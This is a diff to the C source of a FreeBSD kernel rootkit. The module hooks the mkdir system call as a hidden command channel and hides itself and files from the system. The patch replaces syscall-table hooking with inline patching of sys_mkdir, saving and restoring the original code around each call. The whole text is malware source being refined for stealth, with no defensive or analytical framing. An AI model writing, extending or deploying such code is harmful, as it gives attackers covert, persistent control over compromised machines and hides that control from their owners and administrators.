@@ -35,6 +35,8 @@
 #include <sys/sysproto.h>
 #include <sys/syscall.h>
 
+static char *mkdir_prepatch;
+
 static int mkdir_hook(struct thread *td, void *syscall_args);
 static int handle_request(struct thread *td, char *command);
 
@@ -42,7 +44,8 @@ static void
 init(void)
 {
 	/* Enable interface. */
-	hook_syscall_set(SYS_mkdir, mkdir_hook);
+	mkdir_prepatch = hook_fetch(sys_mkdir);
+	hook(sys_mkdir, mkdir_hook);
 
 	/* Hide rootkit. */
 	hide_kld(LINKER_NAME);
@@ -56,7 +59,8 @@ static void
 die(void)
 {
 	/* Disable interface. */
-	hook_syscall_set(SYS_mkdir, sys_mkdir);
+	hook_set(sys_mkdir, mkdir_prepatch);
+	free(mkdir_prepatch, M_TEMP);
 
 	/* Unhide files. */
 	unhide_files();
@@ -84,6 +88,7 @@ load(struct module *module, int cmd, void *arg)
 
 static int
 mkdir_hook(struct thread *td, void *syscall_args) {
+	int ret;
 	int error;
 	char path[255];
 
@@ -99,7 +104,11 @@ mkdir_hook(struct thread *td, void *syscall_args) {
 		}
 	}
 
-	return(sys_mkdir(td, syscall_args));
+	hook_set(sys_mkdir, mkdir_prepatch);
+	ret = sys_mkdir(td, syscall_args);
+	hook(sys_mkdir, mkdir_hook);
+
+	return(ret);
 }
 
 static int
